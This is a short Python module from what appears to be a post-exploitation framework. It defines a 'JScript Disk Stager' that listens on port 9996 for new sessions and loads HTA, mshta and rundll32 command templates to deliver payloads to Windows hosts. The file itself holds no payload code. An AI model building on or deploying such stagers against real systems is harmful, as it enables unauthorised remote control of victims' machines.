import core.stager

class DiskStager(core.stager.Stager):

    NAME = "JScript Disk Stager"
    DESCRIPTION = "Listens for new sessions, using disk for payloads"
    AUTHORS = ['zerosum0x0']

    WORKLOAD = "js"

    def load(self):
        #self.options.set("SRVPORT", 9996)
        self.port = 9996

        self.template = self.loader.load_script("data/stager/js/mshta/template.hta")
        self.stagecmd = self.loader.load_script("data/stager/js/mshta/mshta.cmd")
        self.forkcmd = self.loader.load_script("data/stager/js/rundll32/rundll32.cmd")
